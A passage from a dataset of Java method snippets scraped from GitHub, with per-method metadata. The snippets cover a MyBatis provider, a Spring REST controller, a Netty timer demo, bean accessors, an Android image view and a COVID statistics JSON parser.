databaseId from dataSource\", e);\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/VendorDatabaseIdProvider.java", "stars": "15", "class_props": {"extends": null, "implements": ["DatabaseIdProvider"], "modifiers": ["public"]}}, {"id": 32162, "method_name": "setProperties", "class_name": "VendorDatabaseIdProvider", "params": ["Properties"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setProperties(Properties p) {\n    this.properties = p;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/VendorDatabaseIdProvider.java", "stars": "15", "class_props": {"extends": null, "implements": ["DatabaseIdProvider"], "modifiers": ["public"]}}, {"id": 32163, "method_name": "getDatabaseName", "class_name": "VendorDatabaseIdProvider", "params": ["DataSource"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "String", "snippet": "  private String getDatabaseName(DataSource dataSource) throws SQLException {\n    String productName = getDatabaseProductName(dataSource);\n    if (this.properties != null) {\n      for (Map.Entry<Object, Object> property : properties.entrySet()) {\n        if (productName.contains((String) property.getKey())) {\n          return (String) property.getValue();\n        }\n      }\n      // no match, return null\n      return null;\n    }\n    return productName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/VendorDatabaseIdProvider.java", "stars": "15", "class_props": {"extends": null, "implements": ["DatabaseIdProvider"], "modifiers": ["public"]}}, {"id": 32164, "method_name": "getDatabaseProductName", "class_name": "VendorDatabaseIdProvider", "params": ["DataSource"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "String", "snippet": "  private String getDatabaseProductName(DataSource dataSource) throws SQLException {\n    try (Connection con = dataSource.getConnection()) {\n      DatabaseMetaData metaData = con.getMetaData();\n      return metaData.getDatabaseProductName();\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/VendorDatabaseIdProvider.java", "stars": "15", "class_props": {"extends": null, "implements": ["DatabaseIdProvider"], "modifiers": ["public"]}}, {"id": 32165, "method_name": "dummy", "class_name": "ApiController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String dummy() {\n\t\treturn \"Hi there, This is a Rest api for a project application called SHARE-IT.\" + \"\\n\"\n\t\t\t\t+ \" TO use this API please contact Akif Arfien @akifarfien.\";\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32166, "method_name": "getBean", "class_name": "ApiController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Optional<CopyPasteBean>", "snippet": "\tpublic Optional<CopyPasteBean> getBean(@PathVariable(\"id\") String id) {\n\n\t\tOptional<CopyPasteBean> bean = repository.findById(id);\n\n\t\tif (!(bean.isPresent())) {\n\t\t\tthrow new ApiException(\"ID : \" + id + \" is not found\");\n\t\t} else\n\t\t\treturn bean;\n\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32167, "method_name": "say", "class_name": "ApiController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<CopyPasteBean>", "snippet": "\tpublic List<CopyPasteBean> say() {\n\t\treturn repository.findAll();\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32168, "method_name": "createEntry", "class_name": "ApiController", "params": ["CopyPasteBean"], "throws": null, "modifiers": ["public"], "return_type": "CopyPasteBean", "snippet": "\tpublic CopyPasteBean createEntry(@RequestBody CopyPasteBean bean) {\n\n\t\tDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\"yyyy/MM/dd HH:mm:ss\");\n\t\tLocalDateTime now = LocalDateTime.now();\n\t\tbean.setDateandTime(dtf.format(now));\n\n\t\tUserData ud = new UserData();\n\t\tud.setName(bean.getName());\n\t\tud.setTextmssg(bean.getLastcontent());\n\n\t\tbean.getContentList().add(ud);\n\n\t\tif (bean.getUniqueCodeUrl().isEmpty()) {\n\t\t\tbean.setUniqueCodeUrl(generateString());\n\t\t}\n\n\t\trepository.save(bean);\n\t\treturn bean;\n\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32169, "method_name": "updateEntry", "class_name": "ApiController", "params": ["CopyPasteBean"], "throws": null, "modifiers": ["public"], "return_type": "CopyPasteBean", "snippet": "\tpublic CopyPasteBean updateEntry(@RequestBody CopyPasteBean bean) {\n\n\t\tOptional<CopyPasteBean> dtoOptional = repository.findById(bean.getUniqueCodeUrl());\n\n\t\tif (!(dtoOptional.isPresent())) {\n\n\t\t\tthrow new ApiException(\"ID : \" + bean.getUniqueCodeUrl() + \" is not found\");\n\t\t} else {\n\t\t\tCopyPasteBean dto = dtoOptional.get();\n\n\t\t\tDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\"yyyy/MM/dd HH:mm:ss\");\n\t\t\tLocalDateTime now = LocalDateTime.now();\n\t\t\tdto.setDateandTime(dtf.format(now));\n\t\t\tdto.setLastcontent(bean.getLastcontent());\n\n\t\t\tUserData ud = new UserData();\n\t\t\tud.setName(bean.getName());\n\t\t\tud.setTextmssg(bean.getLastcontent());\n\n\t\t\tdto.getContentList().add(ud);\n\n\t\t\trepository.save(dto);\n\t\t\treturn dto;\n\t\t}\n\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32170, "method_name": "deleteEntries", "class_name": "ApiController", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void deleteEntries() {\n\n\t\tSystem.out.println(\"I am from  Schedul Task\");\n\t\tList<CopyPasteBean> list = new ArrayList<CopyPasteBean>();\n\n\t\tfor (CopyPasteBean bean : repository.findAll()) {\n\n\t\t\tDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\"yyyy/MM/dd HH:mm:ss\");\n\t\t\tLocalDateTime d = LocalDateTime.parse(bean.getDateandTime(), dtf);\n\n\t\t\tLocalDateTime d10 = d.plusMinutes(15); // 10\n\n\t\t\tString newTime = dtf.format(d10);\n\n\t\t\tLocalDateTime now = LocalDateTime.now();\n\n\t\t\tSystem.out.print(newTime);\n\n\t\t\tif (d10.isBefore(now)) {\n\t\t\t\tlist.add(bean);\n\n\t\t\t}\n\n\t\t}\n\n\t\tif (!(list.isEmpty())) {\n\t\t\trepository.deleteAll(list);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32171, "method_name": "generateString", "class_name": "ApiController", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "\tprivate static String generateString() {\n\t\tString uuid = UUID.randomUUID().toString();\n\t\treturn uuid.substring(25);\n\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Controller/ApiController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32172, "method_name": "main", "class_name": "NettyDelayQueue", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n\n        final Timer timer = new HashedWheelTimer(Executors.defaultThreadFactory(), 5, TimeUnit.SECONDS, 2);\n        TimerTask task1 = new TimerTask() {\n            public void run(Timeout timeout) throws Exception {\n                System.out.println(\"order1  5s \u540e\u6267\u884c \");\n                timer.newTimeout(this, 5, TimeUnit.SECONDS);//\u7ed3\u675f\u65f6\u5019\u518d\u6b21\u6ce8\u518c\n            }\n        };\n        timer.newTimeout(task1, 5, TimeUnit.SECONDS);\n        TimerTask task2 = new TimerTask() {\n            public void run(Timeout timeout) throws Exception {\n                System.out.println(\"order2  10s \u540e\u6267\u884c\");\n                timer.newTimeout(this, 10, TimeUnit.SECONDS);//\u7ed3\u675f\u65f6\u5019\u518d\u6ce8\u518c\n            }\n        };\n\n        timer.newTimeout(task2, 10, TimeUnit.SECONDS);\n\n        //\u8be5\u4efb\u52a1\u4ec5\u4ec5\u8fd0\u884c\u4e00\u6b21\n        timer.newTimeout(new TimerTask() {\n            public void run(Timeout timeout) throws Exception {\n                System.out.println(\"order3  15s \u540e\u6267\u884c\u4e00\u6b21\");\n            }\n        }, 15, TimeUnit.SECONDS);\n\n    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/netty/NettyDelayQueue.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32173, "method_name": "getCategorias", "class_name": "CategoriaBean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Categoria>", "snippet": "\tpublic List<Categoria> getCategorias() {\n\t\treturn categorias;\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CategoriaBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32174, "method_name": "getKnifeQQ", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKnifeQQ() {\n        return knifeQQ;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32175, "method_name": "setKnifeQQ", "class_name": "Knife", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setKnifeQQ(String knifeQQ) {\n        this.knifeQQ = knifeQQ;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32176, "method_name": "getNo", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNo() {\n        return no;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32177, "method_name": "setNo", "class_name": "Knife", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNo(int no) {\n        this.no = no;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32178, "method_name": "getHurt", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHurt() {\n        return hurt;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32179, "method_name": "setHurt", "class_name": "Knife", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHurt(int hurt) {\n        this.hurt = hurt;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32180, "method_name": "getDate", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDate() {\n        return date;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32181, "method_name": "setDate", "class_name": "Knife", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDate(String date) {\n        this.date = date;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32182, "method_name": "isComplete", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isComplete() {\n        return complete;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32183, "method_name": "setComplete", "class_name": "Knife", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setComplete(boolean complete) {\n        this.complete = complete;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32184, "method_name": "getId", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32185, "method_name": "setId", "class_name": "Knife", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32186, "method_name": "toString", "class_name": "Knife", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"Knife{\" +\n                \"knifeQQ='\" + knifeQQ + '\\'' +\n                \", no=\" + no +\n                \", hurt=\" + hurt +\n                \", date='\" + date + '\\'' +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/bean/Knife.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32187, "method_name": "setNextApprover", "class_name": "Approver", "params": ["Approver"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNextApprover(Approver approver){\n        this.approver = approver;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/chainofresponsibility/Approver.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32188, "method_name": "deploy", "class_name": "Approver", "params": ["Course"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void deploy(Course course);\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/chainofresponsibility/Approver.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32189, "method_name": "onDetachedFromWindow", "class_name": "RecyclingImageView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDetachedFromWindow() {\n        // This has been detached from Window, so clear the drawable\n        setImageDrawable(null);\n\n        super.onDetachedFromWindow();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/RecyclingImageView.java", "stars": "74", "class_props": {"extends": "ImageView", "implements": null, "modifiers": ["public"]}}, {"id": 32190, "method_name": "setImageDrawable", "class_name": "RecyclingImageView", "params": ["Drawable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setImageDrawable(Drawable drawable) {\n        // Keep hold of previous Drawable\n        final Drawable previousDrawable = getDrawable();\n\n        // Call super to set new Drawable\n        super.setImageDrawable(drawable);\n\n        // Notify new Drawable that it is being displayed\n        notifyDrawable(drawable, true);\n\n        // Notify old Drawable so it is no longer being displayed\n        notifyDrawable(previousDrawable, false);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/RecyclingImageView.java", "stars": "74", "class_props": {"extends": "ImageView", "implements": null, "modifiers": ["public"]}}, {"id": 32191, "method_name": "notifyDrawable", "class_name": "RecyclingImageView", "params": ["Drawable", "boolean"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void notifyDrawable(Drawable drawable, final boolean isDisplayed) {\n        if (drawable instanceof RecyclingBitmapDrawable) {\n            // The drawable is a CountingBitmapDrawable, so notify it\n            ((RecyclingBitmapDrawable) drawable).setIsDisplayed(isDisplayed);\n        } else if (drawable instanceof LayerDrawable) {\n            // The drawable is a LayerDrawable, so recurse on each layer\n            LayerDrawable layerDrawable = (LayerDrawable) drawable;\n            for (int i = 0, z = layerDrawable.getNumberOfLayers(); i < z; i++) {\n                notifyDrawable(layerDrawable.getDrawable(i), isDisplayed);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/RecyclingImageView.java", "stars": "74", "class_props": {"extends": "ImageView", "implements": null, "modifiers": ["public"]}}, {"id": 32192, "method_name": "prepare", "class_name": "StartMenu", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void prepare()\n    {\n        Title title = new Title();\n        addObject(title,450,300);\n        Tanque tanque = new Tanque();\n        addObject(tanque,783,483);\n        \n    }", "url": "https://raw.githubusercontent.com/jesus-antulio/Tankzors-Fangame/master/StartMenu.java", "stars": "1", "class_props": {"extends": "World", "implements": null, "modifiers": ["public"]}}, {"id": 32193, "method_name": "act", "class_name": "StartMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void act(){\n        if(Greenfoot.isKeyDown(\"enter\")){\n            Greenfoot.setWorld(new Level1());\n        }\n       \n    }", "url": "https://raw.githubusercontent.com/jesus-antulio/Tankzors-Fangame/master/StartMenu.java", "stars": "1", "class_props": {"extends": "World", "implements": null, "modifiers": ["public"]}}, {"id": 32194, "method_name": "getContainer", "class_name": "EVEStorageItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "    public ItemStack getContainer() {\n        return container;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32195, "method_name": "getEVE", "class_name": "EVEStorageItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve getEVE() {\n        NBTTagCompound tag = container.getTagCompound();\n        Eve blankEve = new Eve(0, capacity, hueRange.getMid(), brightnessRange.getMid(), 0);\n        if (tag == null || !tag.hasKey(EVE_NBT_KEY))\n            return blankEve;\n        return blankEve.readFromNBT(tag.getCompoundTag(EVE_NBT_KEY));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32196, "method_name": "setEVE", "class_name": "EVEStorageItem", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEVE(Eve incoming) {\n        if (container.getTagCompound() == null)\n            container.setTagCompound(new NBTTagCompound());\n\n        container.getTagCompound().setTag(EVE_NBT_KEY, incoming.writeToNBT());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32197, "method_name": "blendEVE", "class_name": "EVEStorageItem", "params": ["Eve", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve blendEVE(Eve incoming, boolean simulate) {\n        Pairs<Eve, Eve> result = DataHelper.blend(getEVE(), incoming);\n        if (!simulate)\n            setEVE(result.getFirst());\n        return result.getSecond();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32198, "method_name": "getHueRange", "class_name": "EVEStorageItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getHueRange() {\n        return hueRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32199, "method_name": "getBrightnessRange", "class_name": "EVEStorageItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getBrightnessRange() {\n        return brightnessRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32200, "method_name": "canBlend", "class_name": "EVEStorageItem", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canBlend(Eve incoming) {\n        return getHueRange().in(incoming.getHue()) && getBrightnessRange().in(incoming.getBrightness());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32201, "method_name": "hasCapability", "class_name": "EVEStorageItem", "params": ["Capability<?>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCapability(@Nonnull Capability<?> capability, @Nullable EnumFacing facing) {\n        return capability == CapabilityEVE.EVE_ITEM;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32202, "method_name": "getCapability", "class_name": "EVEStorageItem", "params": ["Capability<T>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T getCapability(@Nonnull Capability<T> capability, @Nullable EnumFacing facing) {\n        return capability == CapabilityEVE.EVE_ITEM ? (T) this : null;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageItem.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageItem", "ICapabilityProvider"], "modifiers": ["public"]}}, {"id": 32203, "method_name": "main", "class_name": "dog", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        System.out.println(\"HELLO!!!\" + \"JAVA is coming!\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/HF_code/01/dog.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32204, "method_name": "ptz", "class_name": "PtzController", "params": ["String", "String", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<String>", "snippet": "\tpublic ResponseEntity<String> ptz(@PathVariable String deviceId,@PathVariable String channelId,int leftRight, int upDown, int inOut, int moveSpeed, int zoomSpeed){\n\t\t\n\t\tif (logger.isDebugEnabled()) {\n\t\t\tlogger.debug(String.format(\"\u8bbe\u5907\u4e91\u53f0\u63a7\u5236 API\u8c03\u7528\uff0cdeviceId\uff1a%s \uff0cchannelId\uff1a%s \uff0cleftRight\uff1a%d \uff0cupDown\uff1a%d \uff0cinOut\uff1a%d \uff0cmoveSpeed\uff1a%d \uff0czoomSpeed\uff1a%d\",deviceId, channelId, leftRight, upDown, inOut, moveSpeed, zoomSpeed));\n\t\t}\n\t\tDevice device = storager.queryVideoDevice(deviceId);\n\t\t\n\t\tcmder.ptzCmd(device, channelId, leftRight, upDown, inOut, moveSpeed, zoomSpeed);\n\t\treturn new ResponseEntity<String>(\"success\",HttpStatus.OK);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/vmanager/ptz/PtzController.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32205, "method_name": "clearGlobalVariable", "class_name": "Utility", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void clearGlobalVariable(){\n        GlobalVar.getInstance().setDataStatsCountry(null);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32206, "method_name": "buildDataStats", "class_name": "Utility", "params": ["String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "List<DataStats>", "snippet": "    public static final List<DataStats> buildDataStats(String json) {\n        dataStatsList = new ArrayList<DataStats>();\n        dataStatsList.clear();\n\n        try {\n            JSONArray array = new JSONArray(json);\n            for (int i = 0; i < array.length(); i++) {\n                DataStats dataStats = new DataStats();\n                dataStats.setActiveCases(array.getJSONObject(i).getInt(\"Active\"));\n                dataStats.setCured(array.getJSONObject(i).getInt(\"Recovered\"));\n                dataStats.setDeath(array.getJSONObject(i).getInt(\"Deaths\"));\n                dataStats.setCountry(array.getJSONObject(i).getString(\"Country\"));\n                dataStats.setCountryCode(array.getJSONObject(i).getString(\"CountryCode\"));\n                dataStats.setDate(array.getJSONObject(i).getString(\"Date\"));\n                dataStats.setPostive(array.getJSONObject(i).getInt(\"Confirmed\"));\n                dataStatsList.add(dataStats);\n            }\n        } catch (JSONException e) {\n            Log.e(\"JSONException : \", e.getMessage());\n        }\n        return dataStatsList;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32207, "method_name": "buildDataSummary", "class_name": "Utility", "params": ["String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "List<DataStats>", "snippet": "    public static final List<DataStats> buildDataSummary(String json) {\n        dataStatsList = new ArrayList<DataStats>();\n        dataStatsList.clear();\n        try {\n            JSONArray array = new JSONArray(json);\n            for (int i = 0; i < array.length(); i++) {\n                DataStats dataStats = new DataStats();\n                dataStats.setCured(array.getJSONObject(i).getInt(\"TotalRecovered\"));\n                dataStats.setDeath(array.getJSONObject(i).getInt(\"TotalDeaths\"));\n                dataStats.setCountry(array.getJSONObject(i).getString(\"Country\"));\n                dataStats.setCountryCode(array.getJSONObject(i).getString(\"CountryCode\"));\n                dataStats.setDate(array.getJSONObject(i).getString(\"Date\"));\n                dataStats.setPostive(array.getJSONObject(i).getInt(\"TotalConfirmed\"));\n                dataStatsList.add(dataStats);\n            }\n        } catch (JSONException e) {\n            Log.e(\"JSONException : \", e.getMessage());\n        }\n        return dataStatsList;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32208, "method_name": "buildDataGlobal", "class_name": "Utility", "params": ["String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "DataStats", "snippet": "    public static final DataStats buildDataGlobal(String json) {\n        DataStats dataStats = new DataStats();\n        try {\n            JSONObject jsonObject = new JSONObject(json);\n                dataStats.setCured(jsonObject.getInt(\"TotalRecovered\"));\n                dataStats.setDeath(jsonObject.getInt(\"TotalDeaths\"));\n                dataStats.setPostive(jsonObject.getInt(\"TotalConfirmed\"));\n        } catch (JSONException e) {\n            Log.e(\"JSONException : \", e.getMessage());\n        }\n        return dataStats;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, 